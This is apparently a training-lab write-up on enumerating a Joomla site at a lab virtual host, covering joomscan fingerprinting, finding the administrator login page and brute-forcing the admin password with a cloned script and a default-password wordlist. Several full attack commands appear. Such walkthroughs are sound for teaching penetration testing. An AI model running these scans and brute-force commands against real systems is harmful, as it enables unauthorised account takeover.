# Joomla - Discovery & Enumeration Writeup

**Target IP**: 10.129.250.241

**VHOST**: app.inlanefreight.local

## Step 1: Add Target to /etc/hosts
First, to properly resolve the given virtual host, I manually added the following entry to my /etc/hosts file:
```bash
sudo nano /etc/hosts
```
Added:
```bash
10.129.250.241  app.inlanefreight.local
```
## Step 2: Fingerprint the Joomla Version
Next, I needed to identify the Joomla version running on the target.

I installed joomscan (if not already installed):

```bash
sudo apt install joomscan
```
Then ran the following scan:
```bash
joomscan --url http://app.inlanefreight.local
```
![image](https://github.com/user-attachments/assets/f6eb95fa-b07f-4c76-a759-22f322e74954)

Found the Joomla version.

## Step 3: Find the Joomla Admin Login Page
While running joomscan, I found that the Joomla admin login panel is located at:
```pgsql
http://app.inlanefreight.local/administrator/index.php
```
![image](https://github.com/user-attachments/assets/cf7bd58d-5909-430a-a966-7f57b8273b0e)

## Step 4: Brute Force the Admin Password
To brute-force the Joomla admin password, I downloaded the Joomla brute force script from GitHub:
```bash
git clone https://github.com/ajnik/joomla-bruteforce.git
```
Then navigated into the cloned directory:

`cd joomla-bruteforce`

Ran the brute-force attack:

```bash
sudo python3 joomla-brute.py -u http://app.inlanefreight.local/administrator/index.php -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

![image](https://github.com/user-attachments/assets/ad1f7899-8d87-4a2d-93f3-55133082ea91)

Successfully found the password for the admin user.

## Summary

| **Category**         | **Details**                                               |
|-----------------------|------------------------------------------------------------|
| **IP Address**        | 10.129.250.241                                             |
| **VHOST**             | app.inlanefreight.local                                    |
| **Joomla Version**    | x.x.x (identified using `joomscan`)                        |
| **Admin Panel URL**   | [http://app.inlanefreight.local/administrator/index.php](http://app.inlanefreight.local/administrator/index.php) |
| **Brute-force Tool**  | [joomla-brute.py](https://github.com/ajnik/joomla-bruteforce) |
| **Wordlist Used**     | `/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt` |
| **Username**          | admin                                                      |
| **Password**          | *(Found after brute-forcing)*                              |
